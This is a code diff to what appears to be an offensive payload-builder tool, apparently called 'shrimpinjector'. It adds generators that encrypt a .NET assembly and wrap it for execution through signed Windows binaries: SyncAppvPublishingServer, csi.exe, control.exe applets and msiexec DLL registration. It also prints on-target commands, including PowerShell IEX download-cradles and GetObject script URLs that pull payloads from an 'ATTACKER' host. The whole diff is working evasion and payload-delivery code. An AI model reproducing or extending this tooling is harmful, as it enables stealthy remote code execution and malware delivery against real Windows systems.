@@ -23,6 +23,7 @@ from shrimpinjector.engine import (
     patch_vbs_for_xor,
     remove_block,
     remove_wait_block,
+    uncomment_csharp_block,
 )
 
 OUTPUT_DIR = "output"
@@ -507,7 +508,7 @@ def build_csc(args, assembly_args):
               f" {os.path.basename(output_path)}", file=sys.stderr)
 
 
-def build_powershell(args, assembly_args):
+def _build_ps_family(args, assembly_args, output_file):
     _validate_keying(args)
 
     assembly_bytes = _read_input(args.assembly, "Assembly")
@@ -549,14 +550,29 @@ def build_powershell(args, assembly_args):
     else:
         template = template.replace("YOURARGS", "")
 
-    output_path = args.output or os.path.join(OUTPUT_DIR, "payload_ready.ps1")
+    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
     _ensure_output_dir(output_path)
     with open(output_path, "w") as f:
         f.write(template)
 
     print(f"[+] Written: {output_path}", file=sys.stderr)
+    return output_path
+
+
+def build_powershell(args, assembly_args):
+    output_path = _build_ps_family(args, assembly_args, "payload_ready.ps1")
     print(f"[*] On target:", file=sys.stderr)
     print(f"    powershell -ep bypass -f {os.path.basename(output_path)}", file=sys.stderr)
+
+
+def build_syncappvpub(args, assembly_args):
+    output_path = _build_ps_family(args, assembly_args, "payload_ready.ps1")
+    basename = os.path.basename(output_path)
+    print(f"[*] On target (file — dot-source the .ps1):", file=sys.stderr)
+    print(f'    SyncAppvPublishingServer.exe "n; . .\\{basename}"', file=sys.stderr)
+    print(f"[*] On target (remote — host the .ps1 on your server):", file=sys.stderr)
+    print(f"    SyncAppvPublishingServer.exe \"n; IEX(New-Object Net.WebClient)"
+          f".DownloadString('http://ATTACKER/{basename}')\"", file=sys.stderr)
 
 
 def _build_vbs_family(args, assembly_args, template_file, output_file):
@@ -757,6 +773,63 @@ def _compile_cs_strong(output_path, args):
         sys.exit(1)
 
 
+def build_csi(args, assembly_args):
+    _validate_type_method(args)
+
+    assembly_bytes = _read_input(args.assembly, "Assembly")
+    template_path = get_template_path("csi_payload.csx", args.template)
+    template = load_template(template_path)
+
+    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
+    encrypted_b64 = _b64(encrypted)
+    key_b64 = _b64(key)
+    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)
+
+    if args.encryption == "xor":
+        template = remove_block(template, "// USING_CRYPTO_START", "// USING_CRYPTO_END")
+        template = remove_block(template, "// DECRYPT_AES_START", "// DECRYPT_AES_END")
+        template = uncomment_csharp_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
+        template = inject_placeholders(template, {
+            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
+            '"YOURKEYHERE"': f'"{key_b64}"',
+        })
+    else:
+        template = remove_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
+        iv_b64 = _b64(iv)
+        template = inject_placeholders(template, {
+            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
+            '"YOURKEYHERE"': f'"{key_b64}"',
+            '"YOURIVHERE"': f'"{iv_b64}"',
+        })
+
+    if hasattr(args, "type") and args.type and args.method:
+        template = inject_placeholders(template, {
+            '"YOURTYPEHERE"': f'"{args.type}"',
+            '"YOURMETHODHERE"': f'"{args.method}"',
+        })
+        print(f"[*] Target: {args.type}.{args.method}()", file=sys.stderr)
+    else:
+        template = inject_placeholders(template, {
+            '"YOURTYPEHERE"': '""',
+            '"YOURMETHODHERE"': '""',
+        })
+        print(f"[*] Target: EntryPoint (auto)", file=sys.stderr)
+
+    args_str = _csharp_args(assembly_args, indent=4)
+    if args_str:
+        template = template.replace("    // YOURARGS", args_str)
+
+    output_path = args.output or os.path.join(OUTPUT_DIR, "payload_ready.csx")
+    _ensure_output_dir(output_path)
+    with open(output_path, "w") as f:
+        f.write(template)
+
+    size_kb = os.path.getsize(output_path) / 1024
+    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
+    print(f"[*] On target (csi.exe is in VS/Build Tools Roslyn dir):", file=sys.stderr)
+    print(f"    csi.exe {os.path.basename(output_path)}", file=sys.stderr)
+
+
 def build_regsvr32(args, assembly_args):
     output_path = _build_vbs_family(
         args, assembly_args,
@@ -838,6 +911,133 @@ def build_rundll32(args, assembly_args):
           f'";GetObject("script:http://ATTACKER/{basename}")', file=sys.stderr)
 
 
+def _native_args(assembly_args):
+    if not assembly_args:
+        return None
+    lines = []
+    for i, arg in enumerate(assembly_args):
+        escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
+        lines.append(f'        {{ long idx = {i}; BSTR b = SysAllocString(L"{escaped}");'
+                     f' SafeArrayPutElement(psaArgs, &idx, b); SysFreeString(b); }}')
+    return "\n".join(lines)
+
+
+def _build_native_dll(args, assembly_args, output_file, compile_target):
+    assembly_bytes = _read_input(args.assembly, "Assembly")
+    template_path = get_template_path("native_dll_payload.cpp", args.template)
+    template = load_template(template_path)
+
+    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
+    encrypted_b64 = _b64(encrypted)
+    key_b64 = _b64(key)
+    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)
+
+    if args.encryption == "xor":
+        template = remove_block(template, "// DECRYPT_AES_IV", "// DECRYPT_AES_IV_END")
+        template = remove_block(template, "// DECRYPT_AES_START", "// DECRYPT_AES_END")
+        template = uncomment_csharp_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
+        template = uncomment_csharp_block(template, "// DECRYPT_XOR_LOAD_START", "// DECRYPT_XOR_LOAD_END")
+        template = inject_placeholders(template, {
+            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
+            '"YOURKEYHERE"': f'"{key_b64}"',
+        })
+        args_put = _native_args(assembly_args)
+        argc = len(assembly_args) if assembly_args else 0
+        template = template.replace(
+            "// YOURARGS_XOR_START\n"
+            "        SAFEARRAYBOUND ab = { 0, 0 };\n"
+            "        // YOURARGS_XOR_END",
+            f"        SAFEARRAYBOUND ab = {{ {argc}, 0 }};",
+        )
+        if args_put:
+            template = template.replace("        // YOURARGS_XOR_PUT", args_put)
+        else:
+            template = template.replace("        // YOURARGS_XOR_PUT\n", "")
+        template = template.replace("    // YOURARGS_START\n"
+                                    "            SAFEARRAYBOUND ab = { 0, 0 };\n"
+                                    "            // YOURARGS_END", "")
+        template = template.replace("            // YOURARGS_PUT\n", "")
+    else:
+        template = remove_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
+        template = remove_block(template, "// DECRYPT_XOR_LOAD_START", "// DECRYPT_XOR_LOAD_END")
+        iv_b64 = _b64(iv)
+        template = inject_placeholders(template, {
+            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
+            '"YOURKEYHERE"': f'"{key_b64}"',
+            '"YOURIVHERE"': f'"{iv_b64}"',
+        })
+        args_put = _native_args(assembly_args)
+        argc = len(assembly_args) if assembly_args else 0
+        template = template.replace(
+            "// YOURARGS_START\n"
+            "            SAFEARRAYBOUND ab = { 0, 0 };\n"
+            "            // YOURARGS_END",
+            f"            SAFEARRAYBOUND ab = {{ {argc}, 0 }};",
+        )
+        if args_put:
+            template = template.replace("            // YOURARGS_PUT", args_put)
+        else:
+            template = template.replace("            // YOURARGS_PUT\n", "")
+
+    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
+    _ensure_output_dir(output_path)
+    with open(output_path, "w") as f:
+        f.write(template)
+
+    size_kb = os.path.getsize(output_path) / 1024
+    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
+
+    if getattr(args, "compile", False):
+        _compile_native_dll(output_path, compile_target)
+
+    return output_path
+
+
+def _compile_native_dll(cpp_path, target):
+    gpp = shutil.which("x86_64-w64-mingw32-g++")
+    if not gpp:
+        print("[-] x86_64-w64-mingw32-g++ not found. Install MinGW-w64: brew install mingw-w64",
+              file=sys.stderr)
+        sys.exit(1)
+
+    ext = ".cpl" if target == "cpl" else ".dll"
+    dll_path = os.path.splitext(cpp_path)[0] + ext
+    cmd = (f"x86_64-w64-mingw32-g++ -shared -o {dll_path} {cpp_path} "
+           f"-loleaut32 -lole32 -static-libgcc -static-libstdc++ -s")
+    print(f"[*] Compiling: {cmd}", file=sys.stderr)
+    ret = os.system(cmd)
+    if ret == 0:
+        size_kb = os.path.getsize(dll_path) / 1024
+        print(f"[+] Compiled: {dll_path} ({size_kb:.0f} KB)", file=sys.stderr)
+    else:
+        print(f"[-] Compilation failed (exit code {ret})", file=sys.stderr)
+        sys.exit(1)
+
+
+def build_control(args, assembly_args):
+    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "cpl")
+    cpl_name = os.path.basename(output_path).replace(".cpp", ".cpl")
+    print(f"[*] On target:", file=sys.stderr)
+    print(f"    control.exe {cpl_name}", file=sys.stderr)
+    if not getattr(args, "compile", False):
+        print(f"[*] Compile with:", file=sys.stderr)
+        print(f"    x86_64-w64-mingw32-g++ -shared -o {cpl_name} "
+              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
+              f"-static-libstdc++ -s", file=sys.stderr)
+
+
+def build_msiexec(args, assembly_args):
+    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")
+    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
+    print(f"[*] On target:", file=sys.stderr)
+    print(f"    msiexec /y {dll_name}", file=sys.stderr)
+    if not getattr(args, "compile", False):
+        print(f"[*] Compile with:", file=sys.stderr)
+        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
+              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
+              f"-static-libstdc++ -s", file=sys.stderr)
+
+
 PAYLOAD_BUILDERS = {
     "msbuild": build_msbuild,
     "installutil": build_installutil,
@@ -855,6 +1055,10 @@ PAYLOAD_BUILDERS = {
     "cmstp": build_cmstp,
     "rundll32": build_rundll32,
     "infdefaultinstall": build_infdefaultinstall,
+    "syncappvpub": build_syncappvpub,
+    "csi": build_csi,
+    "control": build_control,
+    "msiexec": build_msiexec,
 }
 
 PAYLOAD_DESCRIPTIONS = {
@@ -874,4 +1078,8 @@ PAYLOAD_DESCRIPTIONS = {
     "cmstp": "CMSTP profile installer (.inf + .sct) — scriptlet via INF",
     "rundll32": "Rundll32 scriptlet (.sct) — JavaScript + GetObject execution",
     "infdefaultinstall": "InfDefaultInstall (.inf + .sct) — lesser-known INF handler",
+    "syncappvpub": "SyncAppvPublishingServer (.ps1) — alt PowerShell host, different process tree",
+    "csi": "C# Interactive (.csx) — csi.exe script, no compilation needed",
+    "control": "Control panel applet (.cpl) — control.exe loads native DLL",
+    "msiexec": "MSI DLL registration (.dll) — msiexec /y DllRegisterServer",
 }
